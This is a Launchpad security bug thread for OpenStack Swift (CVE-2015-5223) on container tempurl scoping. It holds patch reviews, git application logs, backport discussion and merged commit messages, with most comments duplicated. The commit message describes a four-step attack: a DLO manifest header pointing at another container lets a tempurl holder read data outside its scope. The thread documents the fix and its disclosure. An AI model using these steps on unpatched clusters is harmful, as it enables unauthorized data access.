Alright, here's another take on it. The problem is the proxy takes swift.authorize out of the environment. We had a patch to make the environment immutable, but that was a huge change. Then we had one where middlewares could tell the proxy to leave authorize alone, but that's pretty hacky. This one is even simpler: the proxy puts swift.authorize back. Stuff in the proxy that relies on swift.authorize being gone still see it as gone, but middlewares don't have their environment changed up when they make subrequests.

Alright, here's another take on it. The problem is the proxy takes swift.authorize out of the environment. We had a patch to make the environment immutable, but that was a huge change. Then we had one where middlewares could tell the proxy to leave authorize alone, but that's pretty hacky. This one is even simpler: the proxy puts swift.authorize back. Stuff in the proxy that relies on swift.authorize being gone still see it as gone, but middlewares don't have their environment changed up when they make subrequests.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-10: |  |  | [#78](/swift/%2Bbug/1449212/comments/78) |
| --- | --- | --- | --- |

* [tempurl-torgomatic-patch5.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442299/%2Bfiles/tempurl-torgomatic-patch5.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442299)
  (28.3 KiB,
  text/plain)

Let's try actually adding the patch, hey?

Let's try actually adding the patch, hey?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-10: |  |  | [#79](/swift/%2Bbug/1449212/comments/79) |
| --- | --- | --- | --- |

* [tempurl-torgomatic-patch5.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442300/%2Bfiles/tempurl-torgomatic-patch5.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442300)
  (28.3 KiB,
  text/plain)

Let's try actually adding the patch, hey?

Let's try actually adding the patch, hey?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-10: |  |  | [#80](/swift/%2Bbug/1449212/comments/80) |
| --- | --- | --- | --- |

And here we have the legendary DOUBLE DOUBLE POST POST! Thank you, Launchpad, for the opportunity to see this beast in the wild.

And here we have the legendary DOUBLE DOUBLE POST POST! Thank you, Launchpad, for the opportunity to see this beast in the wild.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-10: |  |  | [#81](/swift/%2Bbug/1449212/comments/81) |
| --- | --- | --- | --- |

* [tempurl-torgomatic-patch6.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442310/%2Bfiles/tempurl-torgomatic-patch6.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442310)
  (31.6 KiB,
  text/plain)

Here's a properly-formatted one. It's the same as the one in #79 but with a real commit comment.

I stuck everybody who posted any patch here in the Co-Authored-By lines. With this crapass non-threaded discussion forum, I can't keep track of what happened where. (Come on; \*email\* has threading and Launchpad doesn't? Talk about stone knives and bearskins.)

Here's a properly-formatted one. It's the same as the one in #79 but with a real commit comment.
I stuck everybody who posted any patch here in the Co-Authored-By lines. With this crapass non-threaded discussion forum, I can't keep track of what happened where. (Come on; \*email\* has threading and Launchpad doesn't? Talk about stone knives and bearskins.)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-10: |  |  | [#82](/swift/%2Bbug/1449212/comments/82) |
| --- | --- | --- | --- |

* [tempurl-torgomatic-patch7.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442462/%2Bfiles/tempurl-torgomatic-patch7.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442462)
  (29.4 KiB,
  text/plain)

This is patch #81 with extraneous stuff removed and Alistair's fixes to the functional tests.

This is patch #81 with extraneous stuff removed and Alistair's fixes to the functional tests.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-11: |  |  | [#83](/swift/%2Bbug/1449212/comments/83) |
| --- | --- | --- | --- |

* [tempurl-acoles-patch8.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442888/%2Bfiles/tempurl-acoles-patch8.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442888)
  (29.2 KiB,
  text/plain)

Sam's patch at #82 LGTM

Sam, Clay and 1 did discuss two possible changes:

1. in proxy.server.py the "authorized" boolean is redundant, could just test the value of "old\_authorize".

2. in tempurl.py, have the new scoped authorize callback methods raise HTTPUnauthorized if the split\_path calls ever raise a ValueError (at the moment None is returned which means a request would be auth'd. I can't think of when a request would have no object part and it would matter, but paranoia suggests err'ing on the side of denial if split\_path fails).

I made those two changes in attached patch which applies to master using git am. On my SAIO this passes unit, pep8, functional and probe tests.

Sam's patch at #82 LGTM
Sam, Clay and 1 did discuss two possible changes:
1. in proxy.server.py the "authorized" boolean is redundant, could just test the value of "old\_authorize".
2. in tempurl.py, have the new scoped authorize callback methods raise HTTPUnauthorized if the split\_path calls ever raise a ValueError (at the moment None is returned which means a request would be auth'd. I can't think of when a request would have no object part and it would matter, but paranoia suggests err'ing on the side of denial if split\_path fails).
I made those two changes in attached patch which applies to master using git am. On my SAIO this passes unit, pep8, functional and probe tests.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-08-11: |  |  | [#84](/swift/%2Bbug/1449212/comments/84) |
| --- | --- | --- | --- |

@acoles patch doesn't apply cleanly with `git am` because it was formatted with `git show`

So I started with a fresh merge from master yesterday:

git checkout master

0279411 Merge "versioned writes middleware"

Then I popped off to another branch to add the commits

git checkout -b fix-container-tempurl

Then I applied the fix from lp [bug #1453948](/bugs/1453948) comment #15

git am < dlo-tempurl.patch

Then I applied the fix in comment #82 (seems to require 3-way)

git am -3 < container-tempurl.patch

Those changes taken together works well for me. I understand our new functional tests we should be validating the behaviors we're tracking. I also agree with @acoles suggested cleanups in comment #83 - but we'll need to reformat that patch.

@acoles patch doesn't apply cleanly with `git am` because it was formatted with `git show`
So I started with a fresh merge from master yesterday:
git checkout master
0279411 Merge "versioned writes middleware"
Then I popped off to another branch to add the commits
git checkout -b fix-container-tempurl
Then I applied the fix from lp bug #1453948 comment #15
git am < dlo-tempurl.patch
Then I applied the fix in comment #82 (seems to require 3-way)
git am -3 < container-tempurl.patch
Those changes taken together works well for me. I understand our new functional tests we should be validating the behaviors we're tracking. I also agree with @acoles suggested cleanups in comment #83 - but we'll need to reformat that patch.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-11: |  |  | [#85](/swift/%2Bbug/1449212/comments/85) |
| --- | --- | --- | --- |

* [tempurl-acoles-patch9.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442926/%2Bfiles/tempurl-acoles-patch9.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442926)
  (29.4 KiB,
  text/plain)

Apologies, patch at #83 does not work with git am. See the diff attached here generated using git format-patch.

Apologies, patch at #83 does not work with git am. See the diff attached here generated using git format-patch.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-12: |  |  | [#86](/swift/%2Bbug/1449212/comments/86) |
| --- | --- | --- | --- |

Clays #84 method to apply both patches WFM using patch at #85- thanks Clay for figuring that out:

anc@u128:~/0dev/swift (master)$ git log --pretty=oneline -n 1

810af1b73f309bd055b52fb63795cc5372eee3c7 Merge "Fix shebang of commands"

anc@u128:~/0dev/swift (master)$ git checkout -b fix-container-tempurl

Switched to a new branch 'fix-container-tempurl'

anc@u128:~/0dev/swift (fix-container-tempurl)$ git am ../patches/tempurl.patch

Applying: Disallow unsafe tempurl operations to point to unauthorized data

anc@u128:~/0dev/swift (fix-container-tempurl)$ git am -3 ../patches/tempurl-acoles-patch9.diff

Applying: Better scoping for tempurls, especially container tempurls

Using index info to reconstruct a base tree...

M swift/common/middleware/tempurl.py

M test/functional/tests.py

M test/unit/common/middleware/test\_tempurl.py

Falling back to patching base and 3-way merge...

Auto-merging test/unit/common/middleware/test\_tempurl.py

Auto-merging test/functional/tests.py

Auto-merging swift/common/middleware/tempurl.py

anc@u128:~/0dev/swift (fix-container-tempurl)$ git log --pretty=oneline -n 3

6bdd31aab0098b3ecf756667110fc7439fca8f7f Better scoping for tempurls, especially container tempurls

06bc45e8e76b1384500d67d7953d19fcedcc1967 Disallow unsafe tempurl operations to point to unauthorized data

810af1b73f309bd055b52fb63795cc5372eee3c7 Merge "Fix shebang of commands"

The result passes tox -e py27,pep8 and functional tests on my saio (with keystoneauth).

I'm +2 on patch at #85.

Clays #84 method to apply both patches WFM using patch at #85- thanks Clay for figuring that out:
anc@u128:~/0dev/swift (master)$ git log --pretty=oneline -n 1
810af1b73f309bd055b52fb63795cc5372eee3c7 Merge "Fix shebang of commands"
anc@u128:~/0dev/swift (master)$ git checkout -b fix-container-tempurl
Switched to a new branch 'fix-container-tempurl'
anc@u128:~/0dev/swift (fix-container-tempurl)$ git am ../patches/tempurl.patch
Applying: Disallow unsafe tempurl operations to point to unauthorized data
anc@u128:~/0dev/swift (fix-container-tempurl)$ git am -3 ../patches/tempurl-acoles-patch9.diff
Applying: Better scoping for tempurls, especially container tempurls
Using index info to reconstruct a base tree...
M swift/common/middleware/tempurl.py
M test/functional/tests.py
M test/unit/common/middleware/test\_tempurl.py
Falling back to patching base and 3-way merge...
Auto-merging test/unit/common/middleware/test\_tempurl.py
Auto-merging test/functional/tests.py
Auto-merging swift/common/middleware/tempurl.py
anc@u128:~/0dev/swift (fix-container-tempurl)$ git log --pretty=oneline -n 3
6bdd31aab0098b3ecf756667110fc7439fca8f7f Better scoping for tempurls, especially container tempurls
06bc45e8e76b1384500d67d7953d19fcedcc1967 Disallow unsafe tempurl operations to point to unauthorized data
810af1b73f309bd055b52fb63795cc5372eee3c7 Merge "Fix shebang of commands"
The result passes tox -e py27,pep8 and functional tests on my saio (with keystoneauth).
I'm +2 on patch at #85.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-08-14: |  |  | [#87](/swift/%2Bbug/1449212/comments/87) |
| --- | --- | --- | --- |

I'm +2 on patch @ #85

However, I'll admit that the commit messages makes things seem a little more dire than they would be after the tempurl-can-not-create-dlo fix from lp [bug #1453948](/bugs/1453948) is released. But since neither for them are released I think the wording is correct for this patch.

... now, before you go thinking "maybe we don't need scoped tempurls if you can't make \*LO's with tempurls?" - you \*can\* make \*LO's with write-acl's - so it's a more complicated attack, but if we only did the other change, a write-acl and container-tempurl would be just as vulnerable to the DLO probing as described in the commit. Regardless of how the "object that points to other data" is created - scoping the ability of a container tempurl to grant read access only to the container that created them is critically important to meet our expected risk model.

After this is public we need to do doc change to highlight that container-tempurl's (unlike account-tempurls) don't work with cross-container manifests (again, regardless of how the cross-container manifests were created)

I'm +2 on patch @ #85
However, I'll admit that the commit messages makes things seem a little more dire than they would be after the tempurl-can-not-create-dlo fix from lp bug #1453948 is released. But since neither for them are released I think the wording is correct for this patch.
... now, before you go thinking "maybe we don't need scoped tempurls if you can't make \*LO's with tempurls?" - you \*can\* make \*LO's with write-acl's - so it's a more complicated attack, but if we only did the other change, a write-acl and container-tempurl would be just as vulnerable to the DLO probing as described in the commit. Regardless of how the "object that points to other data" is created - scoping the ability of a container tempurl to grant read access only to the container that created them is critically important to meet our expected risk model.
After this is public we need to do doc change to highlight that container-tempurl's (unlike account-tempurls) don't work with cross-container manifests (again, regardless of how the cross-container manifests were created)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-08-17: |  |  | [#88](/swift/%2Bbug/1449212/comments/88) |
| --- | --- | --- | --- |

Backports of patch #85 are needed for stable/kilo and stable/juno (using patches from [bug 1453948](/bugs/1453948), respectively from comment #17 and #16)

Backports of patch #85 are needed for stable/kilo and stable/juno (using patches from bug 1453948, respectively from comment #17 and #16)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-08-18: |  |  | [#89](/swift/%2Bbug/1449212/comments/89) |
| --- | --- | --- | --- |

This is not needed for stable/juno. The feature (container-level tempurls) was only released in kilo.

This is not needed for stable/juno. The feature (container-level tempurls) was only released in kilo.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-08-18: |  |  | [#90](/swift/%2Bbug/1449212/comments/90) |
| --- | --- | --- | --- |

* [kilo-tempurl-bp-combined.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4446467/%2Bfiles/kilo-tempurl-bp-combined.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4446467)
  (37.2 KiB,
  text/plain)

Attached is a backport of the patch in #85 to kilo. It includes the approved patch for [https://bugs.launchpad.net/swift/+bug/1453948](https://bugs.launchpad.net/swift/%2Bbug/1453948) in the patch file (since it should be applied on top of that one).

Attached is a backport of the patch in #85 to kilo. It includes the approved patch for https://bugs.launchpad.net/swift/+bug/1453948 in the patch file (since it should be applied on top of that one).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-19: |  |  | [#91](/swift/%2Bbug/1449212/comments/91) |
| --- | --- | --- | --- |

+2 for backport at #90

applied to stale/kilo, passes func tests with keystone and tempauth, tox -e pep8,py27 and probe tests

+2 for backport at #90
applied to stale/kilo, passes func tests with keystone and tempauth, tox -e pep8,py27 and probe tests

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-08-19: |  |  | [#92](/swift/%2Bbug/1449212/comments/92) |
| --- | --- | --- | --- |

Can you also attach a version of the patch in #85 with the patch for [bug 1453948](/bugs/1453948) (the one in comment #15) ?

Regardless of the order, they don't apply cleanly.

Can you also attach a version of the patch in #85 with the patch for bug 1453948 (the one in comment #15) ?
Regardless of the order, they don't apply cleanly.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-08-20: |  |  | [#93](/swift/%2Bbug/1449212/comments/93) |
| --- | --- | --- | --- |

* [combined dlo & container tempurl fixes for master (ef8f14f)](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4449743/%2Bfiles/master-tempurl-combined.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4449743)
  (37.2 KiB,
  text/plain)

Ain't nobody trust that crazy -3 business!

(swift)clayg:~/Workspace/vagrant-swift-all-in-one/swift$ git log -n 1 --oneline

    ef8f14f Merge "Add OpenStack release names to changelog"

    (swift)clayg:~/Workspace/vagrant-swift-all-in-one/swift$ git am < master-tempurl-combined.patch

    Applying: Disallow unsafe tempurl operations to point to unauthorized data

    Applying: Better scoping for tempurls, especially container tempurls

Ain't nobody trust that crazy -3 business!
(swift)clayg:~/Workspace/vagrant-swift-all-in-one/swift$ git log -n 1 --oneline
ef8f14f Merge "Add OpenStack release names to changelog"
(swift)clayg:~/Workspace/vagrant-swift-all-in-one/swift$ git am < master-tempurl-combined.patch
Applying: Disallow unsafe tempurl operations to point to unauthorized data
Applying: Better scoping for tempurls, especially container tempurls

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-08-20: |  |  | [#94](/swift/%2Bbug/1449212/comments/94) |
| --- | --- | --- | --- |

Thanks clayg,

the proposed disclosure date is:

2015-08-26, 1500UTC

Thanks clayg,
the proposed disclosure date is:
2015-08-26, 1500UTC

| Changed in ossa: | |
| --- | --- |
| **assignee**: | nobody → Tristan Cacqueray (tristan-cacqueray) |
| **status**: | Confirmed → Fix Committed |

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-08-26

| **information type**: | Private Security → Public Security |
| --- | --- |

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-08-26

| **description**: | updated |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-08-27:  [**Fix merged to swift (master)**](/swift/%2Bbug/1449212/comments/95) |  |  | [#95](/swift/%2Bbug/1449212/comments/95) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/swift/%2Bbug/1449212/comments/95/%2Bdownload) (3.3 KiB)

Reviewed: <https://review.openstack.org/217260>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=d4409c0a046c6ce0e14e18c95efe2cd16cf120e8>

Submitter: Jenkins

Branch: master

commit d4409c0a046c6ce0e14e18c95efe2cd16cf120e8

Author: Samuel Merritt <email address hidden>

Date: Tue Aug 11 09:10:13 2015 -0500

Better scoping for tempurls, especially container tempurls

It used to be that a GET of a tempurl referencing a large object would

    let you download that large object regardless of where its segments

    lived. However, this led to some violated user expectations around

    container tempurls.

(Note on shorthand: all tempurls reference objects. However, "account

    tempurl" and "container tempurl" are shorthand meaning tempurls

    generated using a key on the account or container, respectively.)

Let's say an application is given tempurl keys to a particular

    container, and it does all its work therein using those keys. The user

    expects that, if the application is compromised, then the attacker

    only gains access to the "compromised-container". However, with the old

    behavior, the attacker could read data from \*any\* container like so:

1) Choose a "victim-container" to download

2) Create PUT and GET tempurl for any object name within the

       "compromised-container". The object doesn't need to exist;

       we'll create it.

3) Using the PUT tempurl, upload a DLO manifest with

       "X-Object-Manifest: /victim-container/"

4) Using the GET tempurl, download the object created in step 3. The

       result will be the concatenation of all objects in the

       "victim-container".

Step 3 need not be for all objects in the "victim-container"; for

    example, a value "X-Object-Manifest: /victim-container/abc" would only

    be the concatenation of all objects whose names begin with "abc". By

    probing for object names in this way, individual objects may be found

    and extracted.

A similar bug would exist for manifests referencing other accounts

    except that neither the X-Object-Manifest (DLO) nor the JSON manifest

    document (SLO) have a way of specifying a different account.

This change makes it so that a container tempurl only grants access to

    objects within its container, \*including\* large-object segments. This

    breaks backward compatibility for container tempurls that may have

    pointed to cross container \*LO's, but (a) there are security

    implications, and (b) container tempurls are a relatively new feature.

This works by having the tempurl middleware install an authorization

    callback ('swift.authorize' in the WSGI environment) that limits the

    scope of any requests to the account or container from which the key

    came.

This requires swift.authorize to persist for both the manifest request

    and all segment requests; this is done by having the proxy server

    restore it to the WSGI environment prior to returning from \_\_call\_\_.

[CVE-2015-5223]

Co-Authored-By: Clay Gerrard <email address hidden>

    Co-Authored-By: Alistair Coles <alistair.coles@h...

[Read more...](/swift/%2Bbug/1449212/comments/95)

Reviewed: https://review.openstack.org/217260
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=d4409c0a046c6ce0e14e18c95efe2cd16cf120e8
Submitter: Jenkins
Branch: master
commit d4409c0a046c6ce0e14e18c95efe2cd16cf120e8
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 09:10:13 2015 -0500
Better scoping for tempurls, especially container tempurls
It used to be that a GET of a tempurl referencing a large object would
let you download that large object regardless of where its segments
lived. However, this led to some violated user expectations around
container tempurls.
(Note on shorthand: all tempurls reference objects. However, "account
tempurl" and "container tempurl" are shorthand meaning tempurls
generated using a key on the account or container, respectively.)
Let's say an application is given tempurl keys to a particular
container, and it does all its work therein using those keys. The user
expects that, if the application is compromised, then the attacker
only gains access to the "compromised-container". However, with the old
behavior, the attacker could read data from \*any\* container like so:
1) Choose a "victim-container" to download
2) Create PUT and GET tempurl for any object name within the
"compromised-container". The object doesn't need to exist;
we'll create it.
3) Using the PUT tempurl, upload a DLO manifest with
"X-Object-Manifest: /victim-container/"
4) Using the GET tempurl, download the object created in step 3. The
result will be the concatenation of all objects in the
"victim-container".
Step 3 need not be for all objects in the "victim-container"; for
example, a value "X-Object-Manifest: /victim-container/abc" would only
be the concatenation of all objects whose names begin with "abc". By
probing for object names in this way, individual objects may be found
and extracted.
A similar bug would exist for manifests referencing other accounts
except that neither the X-Object-Manifest (DLO) nor the JSON manifest
document (SLO) have a way of specifying a different account.
This change makes it so that a container tempurl only grants access to
objects within its container, \*including\* large-object segments. This
breaks backward compatibility for container tempurls that may have
pointed to cross container \*LO's, but (a) there are security
implications, and (b) container tempurls are a relatively new feature.
This works by having the tempurl middleware install an authorization
callback ('swift.authorize' in the WSGI environment) that limits the
scope of any requests to the account or container from which the key
came.
This requires swift.authorize to persist for both the manifest request
and all segment requests; this is done by having the proxy server
restore it to the WSGI environment prior to returning from \_\_call\_\_.
[CVE-2015-5223]
Co-Authored-By: Clay Gerrard <clayg@swiftstack.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Co-Authored-By: Christian Schwede <cschwede@redhat.com>
Co-Authored-By: Matthew Oliver <matt@oliver.net.au>
Change-Id: Ie6d52f7a07e87f6fec21ed8b0ec1d84be8b2b11c
Closes-Bug: 1449212

| Changed in swift: | |
| --- | --- |
| **status**: | Confirmed → Fix Committed |

[Thierry Carrez (ttx)](https://launchpad.net/~ttx)
on 2015-09-01

| Changed in swift: | |
| --- | --- |
| **milestone**: | none → 2.4.0 |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-02:  [**Fix proposed to swift (feature/crypto)**](/swift/%2Bbug/1449212/comments/96) |  |  | [#96](/swift/%2Bbug/1449212/comments/96) |
| --- | --- | --- | --- |

Fix proposed to branch: feature/crypto

Review: <https://review.openstack.org/219775>

Fix proposed to branch: feature/crypto
Review: https://review.openstack.org/219775

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-03:  [**Fix merged to swift (feature/crypto)**](/swift/%2Bbug/1449212/comments/97) |  |  | [#97](/swift/%2Bbug/1449212/comments/97) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/swift/%2Bbug/1449212/comments/97/%2Bdownload) (43.3 KiB)

Reviewed: <https://review.openstack.org/219775>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=257e468e9bfd1088040419ad408106ac3c77b531>

Submitter: Jenkins

Branch: feature/crypto

commit e02609c66a804845672413b06830b87395afef31

Author: Samuel Merritt <email address hidden>

Date: Tue Sep 1 15:19:50 2015 -0700

Preserve traceback in swift-dispersion-report

Commit c690bcb fixed a bug in the dispersion report, but changed this

    from a bare "raise" to "raise err", which loses the traceback. Not a

    big deal, but worth putting back IMO.

Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc

commit d06d4ad0fd2dfe69da8008e729651264522c6c06

Author: Minwoo Bae <email address hidden>

Date: Tue Sep 1 15:08:44 2015 -0500

Included reference in swift.obj.diskfile to enumerate the string

    used for data file paths.

Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5

commit 524c89b7eeff037b8a6b421888771e15f98c2da2

Author: John Dickinson <email address hidden>

Date: Fri Aug 21 13:39:41 2015 -0700

Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.

Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661

commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51

Author: Clay Gerrard <email address hidden>

Date: Thu Aug 27 18:35:09 2015 -0700

Make ssync\_sender send valid chunked requests

The connect method of ssync\_sender tells the remote connection that it's

    going to send a valid HTTP chunked request, but if the remote end needs

    to respond with an error of any kind sender throws HTTP right out the

    window, picks up his ball, and closes the socket down hard - much to the

    surprise of the eventlet.wsgi server who up to this point had been

    playing along quite nicely with this 'SSYNC' nonsense assuming that

    everyone here is consenting mature adults.

If you're going to make a "Transfer-Encoding: chunked" request have the

    good decency to finish the job with a proper '0\r\n\r\n'. [1]

N.B. It might be possible to handle an error status during the

    initialize\_request phase with some sort of 100-continue support, but

    honestly it's not entirely clear to me when the server isn't going to

    close the connection if the client is still expected to send the body

    [2] - further if the error comes later during missing\_check or updates

    we'll for sure want to send the chunk transfer termination line before

    we close down the socket and this way we cover both.

1. Really, eventlet.wsgi shouldn't be so blasted brittle about this [3]

    2. <https://lists.w3.org/Archives/Public/ietf-http-wg/2005AprJun/0007.html>

    3. <https://github.com/eventlet/eventlet/commit/c3ce3eef0b4d0dfdbfb1ec0186d4bb204fb8ecd5>

Closes-[Bug #1489587](/bugs/1489587)

    Change-Id: Ic17c6c3075553f8cf6ef6213e62a00282f0d01cf

commit 993ee4e37af1961adba2047d5aa2eb210e423eb3

Author: nakagawamsa <email address hidden>

Date: Fri Aug 28 11:49:43 2015 +0900

Remove duplicate X-Backend-Storage-Policy-Index key

There is duplicate 'X-Backend-Storage-Policy-Index' dictionary key in unit.obj.test\_server.py.

    One key has fixed policy index value, and another ha...

Reviewed: https://review.openstack.org/219775
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=257e468e9bfd1088040419ad408106ac3c77b531
Submitter: Jenkins
Branch: feature/crypto
commit e02609c66a804845672413b06830b87395afef31
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Sep 1 15:19:50 2015 -0700
Preserve traceback in swift-dispersion-report
Commit c690bcb fixed a bug in the dispersion report, but changed this
from a bare "raise" to "raise err", which loses the traceback. Not a
big deal, but worth putting back IMO.
Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc
commit d06d4ad0fd2dfe69da8008e729651264522c6c06
Author: Minwoo Bae <minwoob@us.ibm.com>
Date: Tue Sep 1 15:08:44 2015 -0500
Included reference in swift.obj.diskfile to enumerate the string
used for data file paths.
Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5
commit 524c89b7eeff037b8a6b421888771e15f98c2da2
Author: John Dickinson <me@not.mn>
Date: Fri Aug 21 13:39:41 2015 -0700
Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.
Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661
commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Aug 27 18:35:09 2015 -0700
Make ssync\_sender send valid chunked requests
The connect method of ssync\_sender tells the remote connection that it's
going to send a valid HTTP chunked request, but if the remote end needs
to respond with an error of any kind sender throws HTTP right out the
window, picks up his ball, and closes the socket down hard - much to the
surprise of the eventlet.wsgi server who up to this point had been
playing along quite nicely with this 'SSYNC' nonsense assuming that
everyone here is consenting mature adults.
If you're going to make a "Transfer-Encoding: chunked" request have the
good decency to finish the job with a proper '0\r\n\r\n'. [1]
N.B. It might be possible to handle an error status during the
initialize\_request phase with some sort of 100-continue support, but
honestly it's not entirely clear to me when the server isn't going to
close the connection if the client is still expected to send the body
[2] - further if the error comes later during missing\_check or updates
we'll for sure want to send the chunk transfer termination line before
we close down the socket and this way we cover both.
1. Really, eventlet.wsgi shouldn't be so blasted brittle about this [3]
2. https://lists.w3.org/Archives/Public/ietf-http-wg/2005AprJun/0007.html
3. https://github.com/eventlet/eventlet/commit/c3ce3eef0b4d0dfdbfb1ec0186d4bb204fb8ecd5
Closes-Bug #1489587
Change-Id: Ic17c6c3075553f8cf6ef6213e62a00282f0d01cf
commit 993ee4e37af1961adba2047d5aa2eb210e423eb3
Author: nakagawamsa <nakagawamsa@nttdata.co.jp>
Date: Fri Aug 28 11:49:43 2015 +0900
Remove duplicate X-Backend-Storage-Policy-Index key
There is duplicate 'X-Backend-Storage-Policy-Index' dictionary key in unit.obj.test\_server.py.
One key has fixed policy index value, and another has random value.
Unittest should done with random policy index, so remove key which is set fixed value.
Change-Id: Ic91fcf44d48297d0feee33c928ca682def9790a3
commit 893f30c61d280804e417790dd34ba7bc3fb4f6fc
Author: paul luse <paul.e.luse@intel.com>
Date: Wed Aug 12 13:32:50 2015 -0700
EC GET path: require fragments to be of same set
And if they are not, exhaust the node iter to go get more. The
problem without this implementation is a simple overwrite where
a GET follows before the handoff has put the newer obj back on
the 'alive again' node such that the proxy gets n-1 fragments
of the newest set and 1 of the older.
This patch bucketizes the fragments by etag and if it doesn't
have enough continues to exhaust the node iterator until it
has a large enough matching set.
Change-Id: Ib710a133ce1be278365067fd0d6610d80f1f7372
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Closes-Bug: 1457691
commit d4409c0a046c6ce0e14e18c95efe2cd16cf120e8
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 09:10:13 2015 -0500
Better scoping for tempurls, especially container tempurls
It used to be that a GET of a tempurl referencing a large object would
let you download that large object regardless of where its segments
lived. However, this led to some violated user expectations around
container tempurls.
(Note on shorthand: all tempurls reference objects. However, "account
tempurl" and "container tempurl" are shorthand meaning tempurls
generated using a key on the account or container, respectively.)
Let's say an application is given tempurl keys to a particular
